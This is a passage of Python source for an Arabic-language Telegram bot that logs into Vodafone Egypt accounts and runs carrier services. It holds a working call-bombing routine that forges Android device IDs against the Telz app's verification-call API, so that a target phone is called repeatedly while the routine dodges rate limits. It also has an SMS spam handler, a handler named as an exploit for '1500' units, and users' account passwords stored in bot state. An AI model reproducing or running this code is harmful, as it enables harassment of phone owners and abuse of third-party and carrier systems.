                bot.edit_message_text(WELCOME_MESSAGE + "\n\nاضغط على زر تسجيل الدخول للبدء:", user_id, call.message.message_id, reply_markup=create_main_buttons_keyboard())
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" not in str(e):
                    bot.send_message(user_id, WELCOME_MESSAGE + "\n\nاضغط على زر تسجيل الدخول للبدء:", reply_markup=create_main_buttons_keyboard())
        
        elif action == "login_menu":
            cancel_all_next_steps(user_id)
            try:
                bot.edit_message_text(get_dynamic_message("login_step1"), user_id, call.message.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" not in str(e):
                    bot.send_message(user_id, get_dynamic_message("login_step1"))
            save_user_state(user_id, step="get_login_number", action="login")
        
        elif action == "services_section":
            cancel_all_next_steps(user_id)
            session = get_user_session(user_id)
            if session:
                welcome_msg = f"مرحبا بك مرة أخرى {call.from_user.first_name}!\n\nيمكنك استخدام الخدمات."
                bot.send_message(user_id, welcome_msg, reply_markup=create_all_services_keyboard(user_id))
            else:
                text_msg = get_dynamic_message("login_required")
                try:
                    bot.edit_message_text(text_msg, user_id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(
                        types.InlineKeyboardButton(get_button_name("login"), callback_data="login_menu")
                    ))
                except telebot.apihelper.ApiTelegramException as e:
                    if "message is not modified" not in str(e):
                        bot.send_message(user_id, text_msg, reply_markup=types.InlineKeyboardMarkup().add(
                            types.InlineKeyboardButton(get_button_name("login"), callback_data="login_menu")
                        ))
        
        elif action == "logout":
            logout_user(user_id)
            cancel_all_next_steps(user_id)
            try:
                bot.edit_message_text("✅ تم تسجيل الخروج بنجاح!\n\nتم تسجيل خروجك من جميع الأجهزة.", user_id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🏠 الرئيسية", callback_data="main_buttons")
                ))
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" not in str(e):
                    bot.send_message(user_id, "✅ تم تسجيل الخروج بنجاح!\n\nتم تسجيل خروجك من جميع الأجهزة.", reply_markup=types.InlineKeyboardMarkup().add(
                        types.InlineKeyboardButton("🏠 الرئيسية", callback_data="main_buttons")
                    ))
        
        elif action == "cancel_action":
            clear_user_state(user_id)
            try:
                bot.edit_message_text("✅ تم إلغاء العملية.", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, "✅ تم إلغاء العملية.")
        
        # ===== معالجات السبام =====
        elif action.startswith("spam_send_"):
            number = action.replace("spam_send_", "")
            if user_id not in spam_data or number not in spam_data[user_id]:
                bot.answer_callback_query(call.id, "❌ لم يتم العثور على الرقم!")
                return
            bot.edit_message_text(f"🚀 بدء الإرسال إلى {number}...", user_id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 إيقاف", callback_data="spam_stop")))
            task = Thread(target=run_spam_task, args=(user_id, [number], bot, call.message.chat.id, call.message.message_id))
            task.daemon = True
            task.start()

        elif action.startswith("spam_calls_start_"):
            # تنسيق: spam_calls_start_{number}_{count}_{delay}
            try:
                parts = action.replace("spam_calls_start_", "").split("_")
                number = parts[0]
                count = int(parts[1])
                delay = float(parts[2])
                stop_flags[user_id] = False
                stop_keyboard = types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 إيقاف المكالمات", callback_data="spam_calls_stop")
                )
                msg = bot.edit_message_text(f"📞 جاري الاتصال بـ {number}...\n\n🔢 المكالمة: 1 / {count}", user_id, call.message.message_id, reply_markup=stop_keyboard)

                def run_calls(uid, num, cnt, dly, message_id):
                    import subprocess
                    import uuid as uuid_lib
                    import string as str_lib
                    import requests as req

                    if num.startswith('01') and len(num) == 11:
                        phone_full = f"+2{num}"
                    elif num.startswith('201') and len(num) == 12:
                        phone_full = f"+{num}"
                    else:
                        phone_full = f"+2{num}"

                    install_url = "https://api.telz.com/app/install"
                    auth_call_url = "https://api.telz.com/app/auth_call"
                    headers = {
                        'User-Agent': "Telz-Android/17.5.17",
                        'Content-Type': "application/json",
                        'Accept': 'application/json'
                    }
                    success = 0

                    for i in range(cnt):
                        if stop_flags.get(uid):
                            break
                        try:
                            timestamp = int(time.time() * 1000)
                            android_id = ''.join(random.choices(str_lib.ascii_lowercase + str_lib.digits, k=16))
                            device_uuid = str(uuid_lib.uuid4())

                            payload_install = json.dumps({
                                "android_id": android_id,
                                "app_version": "17.5.17",
                                "event": "install",
                                "google_exists": "yes",
                                "os": "android",
                                "os_version": "9",
                                "play_market": True,
                                "ts": timestamp,
                                "uuid": device_uuid
                            })
                            r1 = req.post(install_url, data=payload_install, headers=headers, timeout=15)

                            if r1.ok:
                                payload_call = json.dumps({
                                    "android_id": android_id,
                                    "app_version": "17.5.17",
                                    "attempt": "0",
                                    "event": "auth_call",
                                    "lang": "ar",
                                    "os": "android",
                                    "os_version": "9",
                                    "phone": phone_full,
                                    "ts": timestamp,
                                    "uuid": device_uuid
                                })
                                r2 = req.post(auth_call_url, data=payload_call, headers=headers, timeout=15)

                                if r2.status_code == 200 and "ok" in r2.text.lower():
                                    success += 1
                                    actual_wait = random.randint(25, 35)
                                elif "try_again_later" in r2.text:
                                    actual_wait = random.randint(45, 60)
                                elif r2.status_code == 429:
                                    bot.edit_message_text(
                                        f"🚫 تم الحظر مؤقتاً\n\n✅ ناجح: {success} / {i+1}",
                                        uid, message_id
                                    )
                                    return
                                else:
                                    actual_wait = random.randint(20, 30)
                            else:
                                actual_wait = random.randint(20, 30)

                        except Exception as e:
                            actual_wait = random.randint(20, 30)

                        try:
                            bot.edit_message_text(
                                f"📞 جاري الاتصال بـ {num}...\n\n"
                                f"🔢 المكالمة: {i+1} / {cnt}\n"
                                f"✅ ناجح: {success}\n"
                                f"⏱️ انتظار {actual_wait} ثانية...",
                                uid, message_id,
                                reply_markup=types.InlineKeyboardMarkup().add(
                                    types.InlineKeyboardButton("🛑 إيقاف المكالمات", callback_data="spam_calls_stop")
                                )
                            )
                        except:
                            pass

                        if i < cnt - 1:
                            time.sleep(actual_wait)

                    try:
                        bot.edit_message_text(
                            f"✅ انتهت المكالمات\n\n"
                            f"📱 الرقم: {num}\n"
                            f"🔢 الإجمالي: {cnt}\n"
                            f"✅ الناجح: {success}",
                            uid, message_id
                        )
                    except:
                        pass

                t = Thread(target=run_calls, args=(user_id, number, count, delay, call.message.message_id))
                t.daemon = True
                t.start()
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)}", show_alert=True)

        elif action == "spam_calls_stop":
            stop_flags[user_id] = True
            bot.answer_callback_query(call.id, "🛑 تم إيقاف المكالمات")
            try:
                bot.edit_message_text("🛑 تم إيقاف المكالمات.", user_id, call.message.message_id)
            except:
                pass
        
        elif action == "spam_stop":
            stop_flags[user_id] = True
            bot.answer_callback_query(call.id, "🛑 تم إيقاف الإرسال")
            try:
                bot.edit_message_text("🛑 تم إيقاف الإرسال.", user_id, call.message.message_id)
            except:
                pass
        
        # ===== معالجات موافقة ورفض الاشتراك المميز مع الخطة =====
        elif action.startswith("approve_sub_"):
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            # تنسيق: approve_sub_weekly_123456 أو approve_sub_monthly_123456
            parts = action.split('_')
            if len(parts) >= 4:
                plan = parts[2]
                target_user = int(parts[3])
            else:
                # للتوافق مع القديم
                plan = "monthly"
                target_user = int(action.replace("approve_sub_", ""))
            
            days = WEEKLY_DAYS if plan == "weekly" else MONTHLY_DAYS
            plan_text = "أسبوعي" if plan == "weekly" else "شهري"
            
            new_end_date = add_subscription(target_user, days, user_id)
            bot.edit_message_text(f"✅ تم تفعيل الاشتراك {plan_text} للمستخدم {target_user} حتى {new_end_date.strftime('%Y-%m-%d')}.", user_id, call.message.message_id)
            try:
                bot.send_message(target_user, f"✅ تمت الموافقة على طلب اشتراكك المميز ({plan_text}) لمدة {days} يوم.")
            except:
                pass
        
        elif action.startswith("reject_sub_"):
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            parts = action.split('_')
            if len(parts) >= 4:
                plan = parts[2]
                target_user = int(parts[3])
            else:
                target_user = int(action.replace("reject_sub_", ""))
            
            plan_text = "أسبوعي" if plan == "weekly" else "شهري" if 'plan' in locals() else "شهري"
            bot.edit_message_text(f"❌ تم رفض طلب الاشتراك ({plan_text}) للمستخدم {target_user}.", user_id, call.message.message_id)
            try:
                bot.send_message(target_user, f"❌ تم رفض طلب اشتراكك المميز ({plan_text}). يرجى التواصل مع المطور.")
            except:
                pass
        
        # ===== معالجات خطط الاشتراك =====
        elif action == "premium_plan_weekly":
            start_premium_payment(user_id, call.message.message_id, "weekly")
        
        elif action == "premium_plan_monthly":
            start_premium_payment(user_id, call.message.message_id, "monthly")
        
        # ===== زر الاشتراك المميز (تحول إلى تواصل مع المطور) =====
        elif action == "premium_subscription_menu":
            # تم استبداله بتواصل مع المطور
            developer_username = get_developer_username()
            bot.edit_message_text(f"👨‍💻 للتواصل مع المطور:\n\n{developer_username}\n\nيمكنك مراسلته مباشرة.", user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("📩 مراسلة المطور", url=f"https://t.me/{developer_username[1:]}")
            ))
        
        elif action == "contact_dev":
            developer_username = get_developer_username()
            bot.edit_message_text(f"👨‍💻 للتواصل مع المطور:\n\n{developer_username}\n\nيمكنك مراسلته مباشرة.", user_id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("📩 مراسلة المطور", url=f"https://t.me/{developer_username[1:]}")
            ))
        
        # ===== زر تجديد الباقة الجديد (تم تعديله) =====
        elif action == "renew_bundle_menu":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            bot.edit_message_text("⏳ جاري تجديد الباقة...", user_id, call.message.message_id)
            Thread(target=lambda: run_renew_bundle(user_id, call.message.message_id, session)).start()
        
        # ===== زر أنظمة فليكس الجديد =====
        elif action == "flex_systems_menu":
            bot.edit_message_text("📋 اختر النظام الذي تريد تفعيله:", user_id, call.message.message_id, reply_markup=create_flex_systems_keyboard())
        
        elif action.startswith("flex_sys_"):
            key = action.replace("flex_sys_", "")
            if key not in FLEX_SYSTEMS:
                bot.answer_callback_query(call.id, "❌ نظام غير موجود")
                return
            system = FLEX_SYSTEMS[key]
            # إذا كان النظام هو ريح بالك، نطلب تأكيد أولاً
            if system['id'] == 'Worry_Free_14PT':
                session = get_user_session(user_id)
                if not session:
                    bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                    return
                save_user_state(user_id, step="rehbalak_confirm", action="flex_systems",
                               data={'number': session['number'], 'password': session['password']})
                keyboard = InlineKeyboardMarkup()
                keyboard.add(
                    InlineKeyboardButton("✅ تأكيد", callback_data="confirm_rehbalak"),
                    InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
                )
                bot.edit_message_text("⚠️ هل أنت متأكد من تحويل إلى نظام ريح بالك (14 قرش)؟", user_id, call.message.message_id, reply_markup=keyboard)
            else:
                save_user_state(user_id, step="confirm_flex_system", action="flex_systems",
                               data={'system': system, 'number': get_user_session(user_id)['number'] if get_user_session(user_id) else None, 'password': get_user_session(user_id)['password'] if get_user_session(user_id) else None})
                if not get_user_session(user_id):
                    bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                    return
                keyboard = create_confirmation_keyboard("flex_system", {'key': key})
                bot.edit_message_text(f"❓ هل أنت متأكد من تفعيل {system['name']}؟", user_id, call.message.message_id, reply_markup=keyboard)
        
        elif action == "confirm_flex_system":
            state = get_user_state(user_id)
            if not state or state.get('step') != 'confirm_flex_system':
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة", show_alert=True)
                return
            data = state['data']
            system = data['system']
            number = data['number']
            password = data['password']
            bot.edit_message_text(f"⏳ جاري تفعيل {system['name']}...", user_id, call.message.message_id)
            def run_activation():
                success, result = activate_flex_system(number, password, system['id'])
                now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                if success:
                    price_str = f" ({system['value']}ج)" if system.get('value') and system['value'] != 0 else ""
                    msg = f"✅ ✅ تم تنفيذ العملية بنجاح! 🔥\n\n📱 الرقم: {number}\n📦 الباقة: {system['name']}{price_str}\n⏰ الوقت: {now_str}\n\n🎉 تمت العملية بنجاح!"
                else:
                    msg = f"❌ ❌ فشل تنفيذ العملية!\n\n📱 الرقم: {number}\n📦 الباقة: {system['name']}\n⏰ الوقت: {now_str}\n\n❌ فشلت العملية!"
                bot.edit_message_text(msg, user_id, call.message.message_id)
                clear_user_state(user_id)
            Thread(target=run_activation).start()
        
        # ===== معالج تزويد يومين (تم تعديله حسب الطلب) =====
        elif action == "confirm_rollover":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            bot.edit_message_text("⏳ جاري تفعيل خدمة تزويد يومين...", user_id, call.message.message_id)
            def run_rollover():
                number = session['number']
                success, result = activate_flex_system(number, session['password'], "FLEX_ROLLOVER")
                now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                if success:
                    msg = f"✅ تم تفعيل الخدمة بنجاح!\n\n📱 الرقم: {number}\n📦 الخدمة: تزويد يومين\n⏰ الوقت: {now_str}\n\n🎉 تمت العملية بنجاح!"
                else:
                    msg = f"❌ تم تزويد يومين من قبل !\n\n📱 الرقم: {number}\n📦 الخدمة: تزويد يومين\n⏰ الوقت: {now_str}\n\n❌ فشل التزويد!"
                bot.edit_message_text(msg, user_id, call.message.message_id)
                clear_user_state(user_id)
            Thread(target=run_rollover).start()
        
        # ===== معالجات 500 وحدة متجددة (جديد) =====
        elif action == "500_units_flow":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            save_user_state(user_id, step="500_units_target", action="500_units",
                           data={'owner_number': session['number'], 'owner_password': session['password']})
            bot.edit_message_text("📱 أرسل رقم الهاتف الذي تريد إرسال الـ 500 وحدة إليه:", user_id, call.message.message_id)
        
        elif action == "confirm_500_units":
            state = get_user_state(user_id)
            if not state or state.get('step') != "500_units_confirm":
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة", show_alert=True)
                return
            data = state['data']
            owner_number = data['owner_number']
            owner_password = data['owner_password']
            target_number = data['target_number']
            bot.edit_message_text("⏳ جاري إرسال الهدية...", user_id, call.message.message_id)
            Thread(target=lambda: run_500_units_execute(user_id, call.message.message_id, owner_number, owner_password, target_number)).start()
        
        # ===== معالج ثغرة 1500 =====
        elif action == "exploit_1500":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            run_exploit_1500_start(user_id, call.message.message_id)
        
        # ===== معالج تأكيد ريح بالك =====
        elif action == "confirm_rehbalak":
            state = get_user_state(user_id)
            if not state or state.get('step') != "rehbalak_confirm":
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة", show_alert=True)
                return
            data = state['data']
            number = data['number']
            password = data['password']
            bot.edit_message_text("⏳ جاري التحويل إلى نظام 14 قرش...", user_id, call.message.message_id)
            Thread(target=lambda: run_rehbalak_conversion(user_id, call.message.message_id, {'number': number, 'password': password})).start()
        
        # ===== معالجات إدارة القنوات الإجبارية =====
        elif action == "admin_manage_channels":
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            admin_manage_channels_menu(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action == "admin_add_channel":
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            admin_add_channel_start(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action == "admin_remove_channel":
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            admin_remove_channel_list(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action == "admin_list_channels":
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            admin_list_channels(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action.startswith("admin_remove_channel_"):
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            channel_id = int(action.replace("admin_remove_channel_", ""))
            admin_remove_channel_confirm(user_id, channel_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action.startswith("admin_remove_confirm_"):
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            channel_id = int(action.replace("admin_remove_confirm_", ""))
            remove_required_channel(channel_id)
            bot.edit_message_text("✅ تم حذف القناة بنجاح!", user_id, call.message.message_id)
            admin_manage_channels_menu(user_id)
        
        # ===== معالج تغيير يوزر المطور =====
        elif action == "admin_change_dev_username":
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            admin_change_dev_username(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        # ===== باقي معالجات الكول باك (بدون تغيير) =====
        elif action == "internet_bundles_menu":
            try:
                bot.edit_message_text("📡 اختر باقة الإنترنت:", user_id, call.message.message_id, reply_markup=create_internet_bundles_keyboard())
            except:
                bot.send_message(user_id, "📡 اختر باقة الإنترنت:", reply_markup=create_internet_bundles_keyboard())
        
        elif action.startswith("ib_select_"):
            key = int(action.split("_")[2])
            bundle = BUNDLES.get(key)
            if not bundle:
                bot.answer_callback_query(call.id, "❌ باقة غير موجودة")
                return
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً", show_alert=True)
                return
            save_user_state(user_id, step="confirm_internet_bundle", action="internet_bundles",
                           data={'bundle': bundle, 'number': session['number'], 'password': session['password']})
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("✅ تأكيد", callback_data=f"ib_confirm_{key}"),
                InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
            )
            try:
                bot.edit_message_text(f"⚠️ تأكيد تفعيل باقة {bundle['name']}\n\nهل أنت متأكد؟", user_id, call.message.message_id, reply_markup=keyboard)
            except:
                bot.send_message(user_id, f"⚠️ تأكيد تفعيل باقة {bundle['name']}\n\nهل أنت متأكد؟", reply_markup=keyboard)
        
        elif action.startswith("ib_confirm_"):
            key = int(action.split("_")[2])
            state = get_user_state(user_id)
            if not state or state.get('step') != 'confirm_internet_bundle':
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة", show_alert=True)
                return
            data = state['data']
            bundle = data['bundle']
            number = data['number']
            password = data['password']
            try:
                bot.edit_message_text(f"⏳ جاري تفعيل باقة {bundle['name']}...", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, f"⏳ جاري تفعيل باقة {bundle['name']}...")
            def run_activation():
                success, result = activate_internet_bundle(number, password, bundle['id'])
                final = f"📦 نتيجة تفعيل {bundle['name']}:\n\n{result}"
                try:
                    bot.edit_message_text(final, user_id, call.message.message_id)
                except:
                    bot.send_message(user_id, final)
                clear_user_state(user_id)
            Thread(target=run_activation).start()
        
        elif action == "cards_categories":
            try:
                bot.edit_message_text("🛒 اختر الكارت الذي تريد شراءه:", user_id, call.message.message_id, reply_markup=create_cards_keyboard())
            except:
                bot.send_message(user_id, "🛒 اختر الكارت الذي تريد شراءه:", reply_markup=create_cards_keyboard())
        
        elif action.startswith("buy_card_"):
            index = int(action.replace("buy_card_", ""))
            if index < 0 or index >= len(CARDS_LIST):
                bot.answer_callback_query(call.id, "❌ كارت غير صحيح")
                return
            
            card_id = CARDS_LIST[index]
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً", show_alert=True)
                return
            
            save_user_state(user_id, step="confirm_card_purchase", action="cards",
                           data={'card_id': card_id, 'number': session['number'], 'password': session['password']})
            
            keyboard = create_confirmation_keyboard("card_purchase", {})
            try:
                bot.edit_message_text(f"⚠️ تأكيد شراء كارت:\n\n{card_id.replace('_', ' ')}\n\nهل أنت متأكد؟", 
                                     user_id, call.message.message_id, reply_markup=keyboard)
            except:
                bot.send_message(user_id, f"⚠️ تأكيد شراء كارت:\n\n{card_id.replace('_', ' ')}\n\nهل أنت متأكد؟", reply_markup=keyboard)
        
        elif action == "confirm_card_purchase":
            state = get_user_state(user_id)
            if not state or state.get('step') != 'confirm_card_purchase':
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة", show_alert=True)
                return
            
            data = state['data']
            card_id = data['card_id']
            number = data['number']
            password = data['password']
            
            try:
                bot.edit_message_text("⏳ جاري شراء الكارت...", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, "⏳ جاري شراء الكارت...")
            
            def run_purchase():
                result = purchase_card_from_vodafone(number, password, card_id)
                try:
                    bot.edit_message_text(result['message'], user_id, call.message.message_id)
                except:
                    bot.send_message(user_id, result['message'])
                clear_user_state(user_id)
            
            Thread(target=run_purchase).start()
        
        elif action.startswith("pkg_"):
            # تم تعطيل هذه الخدمة
            bot.answer_callback_query(call.id, "⚠️ هذه الخدمة معطلة حالياً.", show_alert=True)
        
        elif action.startswith("discount_select_"):
            offer_index = int(action.replace("discount_select_", ""))
            
            state = get_user_state(user_id)
            if not state or state.get('step') != 'discount_offers':
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة!", show_alert=True)
                return
            
            data = state.get('data', {})
            offers = data.get('offers', [])
            login_data = data.get('login_data', {})
            
            if offer_index >= len(offers):
                bot.answer_callback_query(call.id, "❌ العرض غير موجود!", show_alert=True)
                return
            
            selected_offer = offers[offer_index]
            
            data['discount_info'] = selected_offer
            data['login_data'] = login_data
            save_user_state(user_id, step="confirm_discount", action="discount_offers", data=data)
            
            keyboard = create_confirmation_keyboard("discount", {})
            try:
                bot.edit_message_text(f"⚠️ تأكيد تطبيق الخصم\n\n{selected_offer.get('clean_desc', '')}\n\nهل أنت متأكد؟", user_id, call.message.message_id, reply_markup=keyboard)
            except:
                bot.send_message(user_id, f"⚠️ تأكيد تطبيق الخصم\n\n{selected_offer.get('clean_desc', '')}\n\nهل أنت متأكد؟", reply_markup=keyboard)
        
        elif action.startswith("mb_refund_"):
            offer_index = int(action.replace("mb_refund_", ""))
            run_money_back_refund(user_id, call.message.message_id, offer_index)
        
        elif action == "stop_ads_menu":
            try:
                bot.edit_message_text("🎁 اختر الخدمة المطلوبة:", user_id, call.message.message_id, reply_markup=create_stop_ads_menu())
            except:
                bot.send_message(user_id, "🎁 اختر الخدمة المطلوبة:", reply_markup=create_stop_ads_menu())
        
        elif action == "gifts_6":
            run_gifts_6_flow(user_id, call.message.message_id)
        
        # تم إزالة plus_discount واستبداله بـ 500_units_flow
        
        elif action == "package_conversion_menu":
            try:
                bot.edit_message_text("💰 تحويل الأنظمة وتزويد يومين\n\n⚠️ هذه الخدمة معطلة حالياً.\n\nسيتم تفعيلها قريباً.", user_id, call.message.message_id, reply_markup=create_package_conversion_menu())
            except:
                bot.send_message(user_id, "💰 تحويل الأنظمة وتزويد يومين\n\n⚠️ هذه الخدمة معطلة حالياً.\n\nسيتم تفعيلها قريباً.", reply_markup=create_package_conversion_menu())
        
        elif action == "packages_page_2":
            try:
                bot.edit_message_text("💰 تحويل الأنظمة - الصفحة الثانية\n\n⚠️ هذه الخدمة معطلة حالياً.", user_id, call.message.message_id, reply_markup=create_packages_page2_menu())
            except:
                bot.send_message(user_id, "💰 تحويل الأنظمة - الصفحة الثانية\n\n⚠️ هذه الخدمة معطلة حالياً.", reply_markup=create_packages_page2_menu())
        
        elif action.startswith("toggle_btn_"):
            if user_id not in ADMIN_IDS:
                bot.answer_callback_query(call.id, "🚫 غير مصرح", show_alert=True)
                return
            
            button_key = action.replace("toggle_btn_", "")
            current_visible = get_button_visibility(button_key)
            set_button_visibility(button_key, not current_visible)
            
            admin_toggle_buttons_list(user_id)
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action == "back_to_admin":
            if user_id not in ADMIN_IDS:
                return
            bot.send_message(user_id, "👑 لوحة تحكم المالك 👑", reply_markup=create_admin_keyboard())
            try:
                bot.delete_message(user_id, call.message.message_id)
            except:
                pass
        
        elif action == "moneyback_main":
            run_money_back_menu(user_id, call.message.message_id)
        
        elif action == "moneyback_details":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            run_money_back_details(user_id, call.message.message_id, session)
        
        elif action == "moneyback_refundable":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            run_money_back_refundable(user_id, call.message.message_id, session)
        
        elif action == "moneyback_balance":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            run_money_back_balance(user_id, call.message.message_id, session)
        
        elif action == "moneyback_refresh":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            bot.edit_message_text("⏳ جاري تحديث البيانات...", user_id, call.message.message_id)
            run_money_back_refundable(user_id, call.message.message_id, session)
        
        elif action == "balance_transfer_menu":
            run_balance_transfer_menu(user_id, call.message.message_id)
        
        elif action == "bt_new":
            run_balance_transfer_new(user_id, call.message.message_id)
        
        elif action == "bt_history":
            run_balance_transfer_history(user_id, call.message.message_id)
        
        elif action == "bt_confirm":
            state = get_user_state(user_id)
            if state and state.get('step') == "bt_waiting_for_confirmation":
                run_balance_transfer_confirm(user_id, call.message.message_id)
            else:
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة!", show_alert=True)
        
        elif action == "bt_cancel":
            run_balance_transfer_cancel(user_id, call.message.message_id)
        
        elif action == "bt_resend_code":
            state = get_user_state(user_id)
            if state and state.get('step') == "bt_waiting_for_code":
                run_balance_transfer_resend(user_id, call.message.message_id)
            else:
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة!", show_alert=True)
        
        elif action == "confirm_activate_nota15":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            try:
                bot.edit_message_text("⏳ جاري تفعيل النوتة 15...", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, "⏳ جاري تفعيل النوتة 15...")
            Thread(target=lambda: run_activate_nota15(user_id, call.message.message_id, session)).start()
        
        elif action == "confirm_activate_nota40":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            try:
                bot.edit_message_text("⏳ جاري تفعيل النوتة 40...", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, "⏳ جاري تفعيل النوتة 40...")
            Thread(target=lambda: run_activate_nota40(user_id, call.message.message_id, session)).start()
        
        elif action == "confirm_suspend":
            state = get_user_state(user_id)
            if not state or state.get('step') != 'waiting_suspend_confirmation':
                bot.answer_callback_query(call.id, "❌ انتهت الجلسة!", show_alert=True)
                return
            
            try:
                bot.edit_message_text("⏳ جاري تنفيذ طلب إيقاف الخط...", user_id, call.message.message_id)
            except:
                bot.send_message(user_id, "⏳ جاري تنفيذ طلب إيقاف الخط...")
            
            def run_suspend_line():
                data = state.get('data', {})
                manager = VodafoneManager(
                    data['phone'],
                    data['password'],
                    data['national_id']
                )
                
                if manager.get_access_token():
                    result = manager.suspend_line()
                    
                    if result["success"]:
                        response_text = f"✅ {result['message']}"
                    else:
                        response_text = f"❌ فشل إيقاف الخط!\n\n• الخطأ: {result['message']}"
                        
                    try:
                        bot.edit_message_text(response_text, user_id, call.message.message_id)
                    except:
                        bot.send_message(user_id, response_text)
                else:
                    try:
                        bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, call.message.message_id)
                    except:
                        bot.send_message(user_id, "❌ فشل تسجيل الدخول!")
                
                clear_user_state(user_id)
            
            Thread(target=run_suspend_line).start()
        
        elif action.startswith("confirm_"):
            confirm_type = action.replace("confirm_", "")
            
            if confirm_type == "internet_bundle":
                pass
            
            elif confirm_type == "package":
                # تم تعطيل هذه الخدمة
                bot.answer_callback_query(call.id, "⚠️ هذه الخدمة معطلة حالياً.", show_alert=True)
            
            elif confirm_type == "add_two_days":
                # تم تعطيل هذه الخدمة
                bot.answer_callback_query(call.id, "⚠️ هذه الخدمة معطلة حالياً.", show_alert=True)
            
            elif confirm_type == "discount":
                state = get_user_state(user_id)
                if not state or state.get('step') != 'confirm_discount':
                    bot.answer_callback_query(call.id, "❌ انتهت الجلسة!", show_alert=True)
                    return
                
                data = state['data']
                login_data = data['login_data']
                discount_info = data['discount_info']
                
                try:
                    bot.edit_message_text(f"⏳ جاري تطبيق الخصم...", user_id, call.message.message_id)
                except:
                    bot.send_message(user_id, f"⏳ جاري تطبيق الخصم...")
                
                def run_discount():
                    success = purchase_discount_offer(login_data, discount_info)
                    if success:
                        final_text = f"✅ تم تثبيت خصم {discount_info.get('clean_desc', '')} بنجاح!\n\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    else:
                        final_text = f"❌ فشل تثبيت الخصم.\n\n⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    try:
